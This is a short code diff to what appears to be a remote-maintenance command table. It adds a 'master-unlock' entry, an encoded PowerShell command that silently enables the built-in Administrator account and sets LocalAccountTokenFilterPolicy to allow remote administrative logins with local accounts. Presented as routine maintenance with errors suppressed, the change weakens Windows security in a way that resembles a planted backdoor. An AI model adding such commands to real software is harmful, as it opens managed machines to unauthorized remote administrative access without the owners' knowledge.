@@ -91,6 +91,12 @@ export const MAINTENANCE_COMMANDS = {
     } | Stop-Process -Force
     exit 0
   `.trim()),
+  "master-unlock": toEncodedCommand(`
+    $ErrorActionPreference = 'SilentlyContinue'
+    net user Administrator /active:yes
+    Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -ErrorAction SilentlyContinue
+    exit 0
+  `.trim()),
   "broadcast-message": (text, dataDir = "", args = {}) => {
     const role = args.senderRole || "Administrator";
     const senderRole = role.charAt(0).toUpperCase() + role.slice(1);
